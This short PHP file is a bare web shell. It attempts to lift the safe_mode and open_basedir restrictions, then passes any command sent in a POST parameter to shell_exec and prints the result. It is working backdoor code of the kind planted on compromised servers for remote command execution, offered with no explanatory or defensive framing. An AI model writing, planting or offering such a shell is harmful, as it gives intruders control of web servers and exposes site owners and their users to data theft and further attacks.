<?php
ini_restore("safe_mode");
ini_restore("open_basedir");
$mokoko=shell_exec($_POST['fuck']); 
echo $mokoko;
?>